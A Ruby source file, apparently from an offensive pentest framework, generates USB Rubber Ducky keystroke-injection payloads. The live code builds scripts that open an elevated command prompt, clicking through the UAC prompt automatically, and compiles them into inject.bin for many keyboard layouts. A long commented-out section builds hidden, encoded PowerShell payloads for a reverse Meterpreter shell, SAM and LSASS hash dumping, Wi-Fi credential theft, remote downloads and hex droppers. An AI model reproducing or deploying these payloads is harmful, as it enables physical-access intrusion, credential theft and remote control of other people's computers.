#!/usr/bin/env ruby
require 'core'
include Core::Commands
module Ducky
  class Writer
    def menu
      _options.each do |key, ops|
        puts "#{key}) #{ops}"
      end
      rgets('Choice: ', '3')
    end

    def write(choice)
      _options_lambda[choice.to_sym].call
    end

    private

    def _options_lambda
      { :'1' => -> () { admin_with_uac },
        :'2' => -> () { admin_with_out_uac },
        :'3' => -> () { low_priv } }
    end

    def _options
      { :'1' => 'admin_with_uac',
        :'2' => 'admin_with_out_uac',
        :'3' => 'low_priv' }
    end

    def admin_with_uac
      cmd = "DELAY 3000\n"
      cmd << "CTRL ESC\n"
      cmd << "DELAY 200\n"
      cmd << "STRING cmd\n"
      cmd << "CTRL-SHIFT ENTER\n"
      cmd << "DELAY 2000\n"
      cmd << "ALT y\n"
      cmd << "DELAY 2000\n"
    end

    def admin_with_out_uac
      cmd = "DELAY 2000\n"
      cmd << "CTRL ESC\n"
      cmd << "DELAY 200\n"
      cmd << "STRING cmd\n"
      cmd << "CTRL-SHIFT ENTER\n"
      cmd << "DELAY 2000\n"
    end

    def low_priv
      cmd = "DELAY 2000\n"
      cmd << "GUI r\n"
      cmd << "DELAY 500\n"
      cmd << "STRING cmd\n"
      cmd << "ENTER\n"
      cmd << "DELAY 500\n"
    end
  end
  class Compile
    include Core::Files
    def initialize(file_name)
      choice = _pick_language
      language = _language_options[choice.to_sym]
      print_info('Creating Bin File!')
      cmd = _compile_cmd(file_name, language)
      output = `#{cmd}`
      if output =~ /Exception/
        print_error('Wrong Version of Java')
        print_info('Run update-alternatives --config java and select Java 7')
        exit
      else
        print_info(output)
        print_success('Bin File Created!')
      end
    end

    private

    def _pick_language
      _language_options.each do |key, lang|
        puts "#{key}) #{lang}"
      end
      rgets('Choice: ', 1)
    end

    def _language_options
      { :'1' => 'us.properties', :'2' => 'be.properties',
        :'3' => 'it.properties', :'4' => 'dk.properties',
        :'5' => 'es.properties', :'6' => 'uk.properties',
        :'7' => 'sv.properties', :'8' => 'ru.properties',
        :'9' => 'pt.properties', :'10' => 'de.properties',
        :'11' => 'no.properties', :'12' => 'fr.properties' }
    end

    def _compile_cmd(file_name, language)
      cmd = "java -jar #{duck_encode_file}encoder.jar -i "
      cmd << "#{text_path}#{file_name} -o #{file_root}/inject.bin -l "
      cmd << "#{language_dir}#{language} 2>&1"
    end
  end
end
#   def notepad_hex
#     "DELAY 2000\nGUI r\nDELAY 500\nSTRING notepad.exe\nENTER\nDELAY 500"
#   end
#   def save_notepad
#     "CTRL s\n#{temp_path}\nEnter\n"
#   end
#   def ducky_meterpreter_low(encoded_command)
#     #File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
#     File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING powershell -enc #{encoded_command}\nENTER")}
#   end
#   def ducky_meterpreter_uac(encoded_command)
#     File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
#   end
#   def ducky_meterpreter_no_uac(encoded_command)
#     File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
#   end
#   def ducky_hash_dump_uac(encoded_command)
#     #File.open("#{text_path}#{hash_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
#     File.open("#{text_path}#{hash_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
#   end
#   def ducky_hash_dump_no_uac(encoded_command)
#     #File.open("#{text_path}#{hash_dump_file}", 'w') { |f| f.write("#{admin_with_out_uac}\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER") }
#     File.open("#{text_path}#{hash_dump_file}", 'w') { |f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER") }
#   end
#   def ducky_lsass_uac(encoded_command1,encoded_command2)
#     File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 1000\nGUI r\nDELAY 1000\nSTRING cmd\nENTER\nDELAY 2000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
#   end
#   def ducky_lsass_no_uac(encoded_command1,encoded_command2)
#     File.open("#{text_path}#{lsass_dump_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 1000\nGUI r\nDELAY 1000\nSTRING cmd\nENTER\nDELAY 2000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
#   end
#   def ducky_wifi_uac(encoded_command)
#     File.open("#{text_path}#{wifi_dump_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
#   end
#   def ducky_wifi_no_uac(encoded_command)
#     File.open("#{text_path}#{wifi_dump_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
#   end
#   def ducky_wget_uac(encoded_command)
#     File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
#   end
#   def ducky_wget_no_uac(encoded_command)
#     File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
#   end
#   def ducky_wget_low(encoded_command)
#     File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
#   end
#   def ducky_hex_uac(hex_string,encoded_command)
#     File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{notepad_hex}\n#{hex_string}\n#{save_notepad}\n#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
#   end
#   def ducky_hex_no_uac(hex_string,encoded_command)
#     File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{notepad_hex}\n#{hex_string}\n#{save_notepad}\n#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
#   end
#   def ducky_hex_low(hex_string,encoded_command)
#     File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{notepad_hex}\n#{hex_string}\n#{save_notepad}\n#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
#   end
# end
